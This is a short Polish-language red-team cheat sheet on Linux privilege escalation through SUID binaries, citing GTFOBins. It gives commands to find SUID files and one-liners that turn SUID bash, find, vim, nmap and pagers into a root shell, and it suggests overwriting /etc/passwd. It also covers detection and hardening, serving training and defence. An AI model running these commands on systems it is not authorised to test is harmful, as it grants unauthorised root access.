---
title: "SUID & GTFOBins"
category: "red-team"
tags: ["privesc", "linux", "suid", "gtfobins"]
platform: "linux"
mitre: ["T1548.001"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# SUID & GTFOBins

## TL;DR
Binarka z bitem SUID uruchamia się z uprawnieniami właściciela (często root). Jeśli pozwala uruchomić shell/komendę/odczyt pliku — masz privesc. [GTFOBins](https://gtfobins.github.io/) katalog nadużyć.

## Znajdowanie SUID
```bash
find / -perm -4000 -type f 2>/dev/null
# z detalami
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
```

## Typowe nadużycia (SUID → root shell)
```bash
# bash (SUID)      -> zachowaj uprawnienia -p
bash -p
# find
find . -exec /bin/sh -p \; -quit
# vim
vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
# nmap (stare, tryb interaktywny)
nmap --interactive   # potem: !sh
# cp – nadpisz /etc/passwd lub skopiuj wrażliwy plik
# less/more/man – z poziomu pagera: !/bin/sh
```

## Sudo vs SUID
- `sudo -l` → nadużycie przez `sudo <binarka>` (GTFOBins sekcja *Sudo*).
- SUID bit → nadużycie bez sudo (GTFOBins sekcja *SUID*).

## Wykrywanie (Blue Team)
- Nowe pliki SUID poza baseline (`chmod u+s`) — alert.
- auditd na `execve` znanych GTFOBins uruchamianych przez konta serwisowe.

## Mitygacja / Hardening
- Usuń SUID z binarek nieużywających go legalnie: `chmod u-s /path`.
- Baseline SUID (AIDE/tripwire), mount `nosuid` gdzie się da.

## Źródła
- [GTFOBins](https://gtfobins.github.io/)
